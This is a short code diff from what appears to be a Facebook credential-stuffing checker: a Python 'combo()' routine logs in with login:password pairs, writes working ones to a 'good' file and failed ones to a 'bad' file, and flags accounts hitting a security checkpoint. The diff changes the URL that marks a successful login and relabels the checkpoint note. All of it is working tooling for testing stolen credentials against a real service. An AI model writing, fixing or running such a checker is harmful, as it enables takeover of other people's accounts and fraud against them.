@@ -74,11 +74,11 @@ def combo():
         if res.url == 'https://www.facebook.com/login.php':
             print(cd('BAD  ' + login + ':' + password,'red'))
             bad.write(login + ':' + password + '\n')
-        elif res.url == 'https://www.facebook.com/':
+        elif res.url == 'https://www.facebook.com/?sk=welcome':
             print(cd('GOOD  ' + login + ':' + password, 'green'))
             good.write(login + ':' + password + '\n')
         elif res.url == 'https://www.facebook.com/checkpoint/?next':
-            good.write(login + ':' + password + '    NEED CHECKPOIN(MAYBE BAN)' + '\n')
+            good.write(login + ':' + password + '    Checkpoint(banned)' + '\n')
             print(cd('good, but need checkpoint', 'blue'))
             print(cd(login + ":" + password, 'blue'))
         else:
